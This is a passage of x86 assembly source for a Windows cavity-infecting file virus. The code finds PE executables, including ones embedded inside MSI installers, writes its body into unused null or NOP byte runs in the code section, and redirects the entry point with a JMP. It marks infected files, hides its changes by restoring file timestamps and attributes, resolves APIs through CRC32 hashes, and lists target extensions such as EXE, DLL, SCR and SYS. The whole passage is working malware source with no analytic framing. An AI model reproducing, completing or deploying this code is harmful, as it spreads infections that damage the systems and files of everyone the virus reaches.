       push edx
       push eax
       call [ebp + a_CreateFileMappingA - gdelta]  ;create file-mapping object
       xchg eax, ecx
       jecxz endCreateMapping          ;quit if error
       mov [ebp + hMapFile - gdelta], ecx  ;save the handle

       xor edx, edx
       push edx
       push edx
       push edx
       push FILE_MAP_WRITE
       push ecx
       call [ebp + a_MapViewOfFile - gdelta]   ;map view of file
       xchg eax, ecx
       jecxz endMapFile            ;quit if error
       mov [ebp + lpFile - gdelta], ecx    ;save the address to variable
       jmp nOpen               ;continue on next label

   closeFile:
       push 12345678h              ;address of mapped file
   lpFile = dword ptr $-4
       call [ebp + a_UnmapViewOfFile - gdelta] ;unmap view of file

   endMapFile:
       push 12345678h              ;handle to file-mapping object
   hMapFile = dword ptr $-4
       call [ebp + a_CloseHandle - gdelta] ;close it

   endCreateMapping:
       mov edx, 12345678h      ;address of real WFD
   aWFD = dword ptr $-4
       lea eax, [edx.WFD_ftLastWriteTime]
       push eax
       lea eax, [edx.WFD_ftLastAccessTime]
       push eax
       lea eax, [edx.WFD_ftCreationTime]
       push eax
       push dword ptr [ebp + hFile - gdelta]
       call [ebp + a_SetFileTime - gdelta] ;restore the file time

       push 12345678h              ;handle of the opened file
   hFile = dword ptr $-4
       call [ebp + a_CloseHandle - gdelta] ;close file

   i_error:
       mov edx, [ebp + aWFD - gdelta]
       push dword ptr [edx.WFD_dwFileAttributes]
       lea eax, [edx.WFD_szFileName]   ;set back
       push eax            ;file attributes
       call [ebp + a_SetFileAttributesA - gdelta]  ;...
   c_error:popad
       ret             ;and quit

   nOpen:  mov esi, ecx
       mov ecx, 0
   pe_msi = dword ptr $-4
       jecxz msi_search        ;semaphore, 0 if MSI, otherwise its PE
       call mz_search          ;it is PE
       test edx, edx
       je closeFile            ;quit if error
       call infect_mz          ;try to infect PE
       jmp closeFile           ;close file and quit

   msi_search:
       cmp [esi], 0E011CFD0h       ;check the MSI header
       jne closeFile           ;it aint MSI, quit
       cmp [esi+4], 0E11AB1A1h     ;...
       jne closeFile           ;...

       push 30             ;try to infect 30 PE files
       pop ecx             ;counter as ECX
   infect_msi:
       push ecx            ;store counter
       call mz_search          ;check the file
       test edx, edx
       je end_msi          ;quit if error

       call get_random         ;get random number 0-1
       je end_msi          ;dont infect this PE if ZERO

       call infect_mz          ;and try to infect it
   end_msi:pop ecx             ;restore counter
       mov esi, 0                      ;get possition
   pos = dword ptr $-4
       inc esi             ;increment it
       loop infect_msi         ;and continue with searching
       jmp closeFile           ;close the MSI file

   mz_search:
       pushad              ;store all registers
       @SEH_SetupFrame <jmp e_mz>  ;setup SEH frame
   r_byte: mov [ebp + pos - gdelta], esi   ;save the possition
       movzx eax, word ptr [esi]   ;get two bytes
       not eax
       cmp eax, not 'ZM'       ;is it "MZ"?
       jne n_byte          ;nope, try next bytes
       mov edx, [esi.MZ_lfanew]
       mov eax, [ebp + aWFD - gdelta]  ;get address of WFD
       cmp [eax.WFD_nFileSizeLow], edx ;is the pointer valid?
       jb n_byte
       add edx, esi            ;get to PE header
       mov eax, [edx]          ;get four bytes
       not eax
       cmp eax, not "EP"       ;is it PE\0\0?
       jne n_byte          ;no, try next bytes
   end_mz: mov [esp.Pushad_edx+8], edx ;save EDX
       mov [esp.Pushad_esi+8], esi ;save ESI
       @SEH_RemoveFrame        ;remove SEH frame
   q_null: popad               ;restore all registers
   e_ret:  ret             ;and quit
   e_mz:   xor edx, edx            ;set the flag
       jmp end_mz          ;and quit
   n_byte: inc esi             ;increment possition
       jmp r_byte          ;and continue searching

   infect_mz:
       ;ESI - start of MZ
       ;EDX - start of PE

       movzx ebx, word ptr [edx.NT_FileHeader.FH_SizeOfOptionalHeader]
       lea ebx, [edx+ebx+IMAGE_SIZEOF_FILE_HEADER+4]   ;get to section header
       mov eax, [ebx.SH_PointerToRawData]
       add eax, esi
       xchg eax, esi
       mov edi, [ebx.SH_SizeOfRawData]
       cmp [ebx.SH_VirtualSize], edi   ;VirtualSize mustnt be smaller
       jb e_ret            ;than SizeOfRawData

       ;EBX - start of .text section
       ;ESI - start of code
       ;EDI - size of code

   HOW_MANY_BYTES = virtual_end-Start  ;how big hole in file do we need

       pushad              ;store all registers
   no_null:xor edx, edx            ;set the counter to zero
   null:   dec edi             ;decrement counter
       test edi, edi           ;end of file?
       je q_null           ;yeah, quit
       call is_null            ;check for garbage byte
       jecxz no_null           ;no garbage, try next byte
       inc edx             ;yeah, increment counter
       cmp edx, HOW_MANY_BYTES     ;have we enough garbage bytes?
       jne null            ;nope, find another
       sub esi, HOW_MANY_BYTES     ;get to the beginning
       mov [esp.Pushad_edi], esi   ;save the pointer
       popad               ;restore all registers

   ;at this point:
   ;   EAX - address of MZ header (inside MSI file)
   ;   EBX - address of the first section header (.text)
   ;   ECX - address of mapped MSI file
   ;   EDX - address of PE header
   ;   EDI - address of junk code which can be patched

       xchg eax, esi
       cmp word ptr [edx.NT_FileHeader.FH_Machine], IMAGE_FILE_MACHINE_I386
       jne endInfection        ;must be 386+
       mov ax, [edx.NT_FileHeader.FH_Characteristics]
       test ax, IMAGE_FILE_EXECUTABLE_IMAGE    ;must be executable image
       je endInfection
       test ax, IMAGE_FILE_SYSTEM  ;mustnt be system file
       jne endInfection
       cmp byte ptr [edx.NT_OptionalHeader.OH_MinorLinkerVersion], 29h
       je endInfection         ;check, if the file is already infected
       mov al, byte ptr [edx.NT_OptionalHeader.OH_Subsystem]
       test al, IMAGE_SUBSYSTEM_NATIVE
       jne endInfection        ;mustnt be driver

       mov eax, [edx.NT_OptionalHeader.OH_AddressOfEntryPoint]
       sub eax, [ebx.SH_VirtualAddress]
       add eax, [ebx.SH_PointerToRawData]
       add eax, esi            ;get to the entrypoint in the file
       push edi
       sub edi, 5
       cmp edi, eax
       pop edi
       jb endInfection     ;check if the entrypoint is the same location as
                   ;the hole in the file

       cmp [ebx.SH_VirtualSize], virtual_end-Start
       jb endInfection

       push dword ptr [ebp + OrigEPPtr - gdelta]   ;save the pointer to EP
       push dword ptr [ebp + OrigBytes - gdelta]   ;save the saved bytes
       push dword ptr [ebp + OrigBytes+4 - gdelta] ;save the fifth one
       mov eax, [edx.NT_OptionalHeader.OH_AddressOfEntryPoint]
       push eax
       add eax, [edx.NT_OptionalHeader.OH_ImageBase]   ;EAX=entrypoint VA
       mov [ebp + OrigEPPtr - gdelta], eax     ;save it
       pop eax

       sub eax, [ebx.SH_VirtualAddress]
       add eax, [ebx.SH_PointerToRawData]
       add eax, esi
       xchg eax, esi               ;get to entrypoint in RAW file
       mov eax, [esi]
       mov [ebp + OrigBytes - gdelta], eax ;save first five bytes
       mov al, [esi+4]
       mov [ebp + OrigBytes+4 - gdelta], al    ;...

       mov eax, edi
       sub eax, esi
       sub eax, 5
       mov byte ptr [esi], 0e9h    ;build JMP LARGE
       mov [esi+1], eax        ;VIRUS_ADDRESS

       or [ebx.SH_Characteristics], IMAGE_SCN_MEM_WRITE    ;set the flag
       mov byte ptr [edx.NT_OptionalHeader.OH_MinorLinkerVersion], 29h
                       ;set already_infected mark
       lea esi, [ebp + Start - gdelta] ;get the start of virus
       mov ecx, (end_virus-Start+3)/4  ;number of DWORDs
       rep movsd           ;move virus to file
       pop dword ptr [ebp + OrigBytes+4 - gdelta]  ;restore saved bytes
       pop dword ptr [ebp + OrigBytes - gdelta]    ;...
       pop dword ptr [ebp + OrigEPPtr - gdelta]    ;restore the pointer to EP
   endInfection:
       ret

   is_null:xor ecx, ecx            ;zero flag
       lodsb               ;load byte
       test al, al         ;is it NULL?
       jne n1_null         ;nope
   null_ok:inc ecx             ;yeah, set flag
       ret             ;and quit
   n1_null:cmp al, 90h         ;is it NOP?
       je null_ok          ;nope
   n2_null:cmp al, 0CCh            ;is it INT 3?
       je null_ok          ;yeah, set flag and quit
       ret             ;nope, quit

   get_base:               ;procedure for getting K32 base address
       mov eax, [esp.cPushad+0ch]  ;get return address
       and eax, 0ffff0000h     ;get only high address
       @SEH_SetupFrame <jmp end_k32>   ;setup SEH frame
   try_k32:movzx edx, word ptr [eax]   ;get two bytes
       not edx             ;negate them
       cmp edx, not "ZM"       ;is it MZ header?
       jne n_k32           ;no, move to next address
       mov ebx, [eax.MZ_lfanew]    ;get pointer to PE header
       add ebx, eax            ;normalize it
       mov ebx, [ebx]          ;get four bytes
       not ebx             ;negate them
       cmp ebx, not "EP"       ;is it PE header?
       je g_k32            ;yeah, we got K32 base
   n_k32:  add eax, -1000h         ;nope, move to next address
       jmp try_k32         ;and try to find base again
   end_k32:xor eax, eax            ;not found, set flag then
   g_k32:  @SEH_RemoveFrame        ;remove SEH frame
       ret             ;and quit

   get_apis:
       lea esi, [ebp + crc32s - gdelta]    ;get CRC32 values of APIs
       lea edi, [ebp + a_apis - gdelta]    ;where to store API addresses
       push crc32c                 ;how many APIs do we need?
       pop ecx                 ;...
   g_apis: push eax            ;save K32 base
       pushad              ;store all registers
       @SEH_SetupFrame <jmp end_gpa>   ;setup SEH frame
       mov edi, [eax.MZ_lfanew]    ;move to PE header
       add edi, eax            ;...
       mov ecx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
       jecxz end_gpa               ;quit if no exports
       mov ebx, eax
       add ebx, [edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
       mov edx, eax            ;get address of export table
       add edx, [ebx.ED_AddressOfNames]    ;address of API names
       mov ecx, [ebx.ED_NumberOfNames] ;number of API names
       mov edi, edx
       push dword ptr [esi]        ;save CRC32 to stack
       mov ebp, eax
       xor eax, eax
   APIname:push eax
       mov esi, ebp            ;get base
       add esi, [edx+eax*4]        ;move to API name
       push esi            ;save address
       @endsz              ;go to the end of string
       sub esi, [esp]          ;get string size
       mov edi, esi            ;move it to EDI
       pop esi             ;restore address of API name
       call CRC32          ;calculate CRC32 of API name
       cmp eax, [esp+4]        ;is it right API?
       pop eax
       je g_name           ;yeah, we got it
       inc eax                         ;increment counter
       loop APIname            ;and search for next API name
   end_gpa:xor eax, eax            ;set flag
   ok_gpa: @SEH_RemoveFrame        ;remove SEH frame
       mov [esp.Pushad_eax], eax   ;save value to stack
       popad               ;restore all registers
       stosd               ;save address
       test eax, eax
       pop eax
       je q_gpa            ;quit if error
       add esi, 4          ;move to next CRC32
       loop g_apis         ;search for API addresses in a loop
       ret             ;and quit
   q_gpa:  pop eax
       jmp end_host            ;quit if error
   g_name: pop edx
       mov edx, ebp
       add edx, [ebx.ED_AddressOfOrdinals]
       movzx eax, word ptr [edx+eax*2]
       cmp eax, [ebx.ED_NumberOfFunctions]
       jae end_gpa
       mov edx, ebp            ;base of K32
       add edx, [ebx.ED_AddressOfFunctions]    ;address of API functions
       add ebp, [edx+eax*4]        ;get API function address
       xchg eax, ebp           ;we got address of API in EAX
       jmp ok_gpa          ;quit

   CRC32:  push ecx            ;procedure to calculate CRC32
       push edx
       push ebx
           xor ecx, ecx
           dec ecx
           mov edx, ecx
   NextByteCRC:
           xor eax, eax
           xor ebx, ebx
           lodsb
           xor al, cl
       mov cl, ch
       mov ch, dl
       mov dl, dh
       mov dh, 8
   NextBitCRC:
       shr bx, 1
       rcr ax, 1
       jnc NoCRC
       xor ax, 08320h
       xor bx, 0EDB8h
   NoCRC:  dec dh
       jnz NextBitCRC
       xor ecx, eax
       xor edx, ebx
           dec edi
       jne NextByteCRC
       not edx
       not ecx
       pop ebx
       mov eax, edx
       rol eax, 16
       mov ax, cx
       pop edx
       pop ecx
       ret

   get_random:
       pushad                  ;store all registers
       call [ebp + a_GetTickCount - gdelta]    ;get random number
       and eax, 2              ;1:2 possibility
       test eax, eax               ;is it ZERO?
       popad                   ;restore all registers
       ret

   ;API's CRC32's
   crc32s      dd  0AE17EBEFh      ;FindFirstFileA
           dd  0AA700106h      ;FindNextFileA
           dd  0C200BE21h      ;FindClose
           dd  03C19E536h      ;SetFileAttributesA
           dd  04B2A3E7Dh      ;SetFileTime
           dd  08C892DDFh      ;CreateFileA
           dd  096B2D96Ch      ;CreateFileMappingA
           dd  0797B49ECh      ;MapViewOfFile
           dd  094524B42h      ;UnmapViewOfFile
           dd  068624A9Dh      ;CloseHandle
           dd  0613FD7BAh      ;GetTickCount
           dd  042F13D06h      ;GetVersion
           dd  0EBC6C18Bh      ;GetCurrentDirectoryA
           dd  0B2DBD7DCh      ;SetCurrentDirectoryA
           dd  04134D1ADh      ;LoadLibraryA
           dd  0FFC97C1Fh      ;GetProcAddress
           dd  0AFDF191Fh      ;FreeLibrary
   crc32c = ($-crc32s)/4

   ;file extension's CRC32's
   file_extension_table:
   _ACM        dd  0AC705BF1h  ; .ACM extension
   _AX     dd  0629337BAh  ; .AX extension
   _CNV        dd  0A797CBB3h  ; .CNV extension
   _COM        dd  00F636A1Eh  ; .COM extension
   _CPL        dd  00102BF12h  ; .CPL extension
   _DLL        dd  089E9DDBFh  ; .DLL extension
   _DRV        dd  02F7CA91Eh  ; .DRV extension
   _EXE        dd  0FBB80A3Fh  ; .EXE extension
   _MPD        dd  029044229h  ; .MPD extension
   _OCX        dd  07B1ACAD6h  ; .OCX extension
   _PCI        dd  020B9AE0Fh  ; .PCI extension
   _SCR        dd  09B3ACA7Bh  ; .SCR extension
   _SYS        dd  09390DD9Ch  ; .SYS extension
   _TSP        dd  028FD3330h  ; .TSP extension
   _TLB        dd  04773A7AEh  ; .TLB extension
   _VWP        dd  085FD5367h  ; .VWP extension
   _WPC        dd  059E16315h  ; .WPC extension
   file_extension_table_end:

   szCurDir    db      '\',00h         ; Null-terminated string that
   szCurDir_   db      '..',00h        ; Null-terminated string that
                                           ; specifies the path to the new
                                           ; current directory
   szFileName  db      '*.*',00h       ; Name of file to search for
   end_virus:              ; end of virus in file

   a_apis:                 ;API addresses
   a_FindFirstFileA    dd  ?
   a_FindNextFileA     dd  ?
   a_FindClose     dd  ?
   a_SetFileAttributesA    dd  ?
   a_SetFileTime       dd  ?
   a_CreateFileA       dd  ?
   a_CreateFileMappingA    dd  ?
   a_MapViewOfFile     dd  ?
   a_UnmapViewOfFile   dd  ?
   a_CloseHandle       dd  ?
   a_GetTickCount      dd  ?
   a_GetVersion        dd  ?
   a_GetCurrentDirectoryA  dd  ?
   a_SetCurrentDirectoryA  dd  ?
   a_LoadLibraryA      dd  ?
   a_GetProcAddress    dd  ?
   a_FreeLibrary       dd  ?


   cBuffer         db      MAX_PATH dup(?) ; Buffer for the current
                                               ; directory string.
   cBuffer_        db      MAX_PATH dup(?) ; Buffer for the current
                                               ; directory string.
   WFD     WIN32_FIND_DATA ?       ; WIN32_FIND_DATA
   virtual_end:                    ; end of virus in memory
   exit_process        dd  offset ExitProcess  ;used by first gen. only


   ends                    ;end of .code section
   end Start               ;end of virus
